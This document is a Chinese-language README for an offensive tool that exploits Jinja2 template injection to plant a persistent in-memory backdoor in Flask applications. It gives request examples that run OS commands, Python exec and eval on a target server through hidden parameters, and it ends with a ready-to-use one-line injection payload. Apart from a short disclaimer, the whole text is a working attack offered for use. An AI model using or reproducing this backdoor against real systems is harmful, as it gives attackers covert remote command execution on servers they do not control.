## JinjaShip
Jinja2模板注入,路由注入内存马

路由注入内存马是一种无文件Web后门技术，通过动态向JinJa2模板添加恶意路由来实现内存中持久化，无需将代码写入磁盘文件即可获得远程代码命令执行能力。

该项目在攻击者取得 服务端模板`exec`函数的调用方式 后可以使用，通过执行代码直接控制JinJa2模板的`flask.current_app.before_request_funcs`内的函数，实现动态注册恶意路由，实现内存马注入。


### 使用方式
  [English](README_en.md) | **Chinese**

  注入方式见**文末**

#### 参数传入
您可以通过GET,POST,UA方式以参数的方式传入命令或代码在目标机器上执行

    https://target.com/?she11=whoami

    curl -X POST https://target.com/ -d "ec0de=os.getcwd()"

    curl -H "c0de: import urllib.request;urllib.request.urlopen('https://example.com')" https://target.com/


#### 参数使用

- **she11**

  执行系统命令,当该命令返回为空时,在页面**无回显**

  您被期待以 `echo ok %26%26 你的命令 2>%261` 的方式获取成功执行的回显

- **c0de**

  exec函数执行python代码,该函数没有回显,故在页面**无回显**

  当该命令**报错**时,会在页面**显示回显**

- **ec0de**

  eval函数执行python表达式,捕获执行结果转为str类型,并在页面**显示回显**

  捕获报错,进行回显


#### 其他事项
- 执行python代码时,可直接使用`app`(flask.current_app)和`os`,`request`(flask.request),这是后门注入时预设的全局变量

- 你可以通过修改backdoor函数实现别的功能,但注意访问网页时js,css等请求也会执行backdoor函数,虽然不会传参,但可能会产生意想不到的后果

- 你可以多次执行该注入命令,且不会产生重复的后门添加和执行

- 你应当在请求内使用注入命令,否则将无法正常获取app(Flask对象),并成功注入



### ❗注意事项

- 您不应当将其用于任何**非法**用途,作者不承担由您任何行为引发的任何非法后果



### 注入方式

##### **使用exec函数执行最后一行代码exec内的内容**

最后附送一个一句话后门喵~

    exec('''
    
    __import__('flask').current_app.before_request_funcs.setdefault(None, []).append(lambda:(None if (__import__('os').popen(__import__('flask').request.args.get('she11','')).read()) else None))
    
    ''')






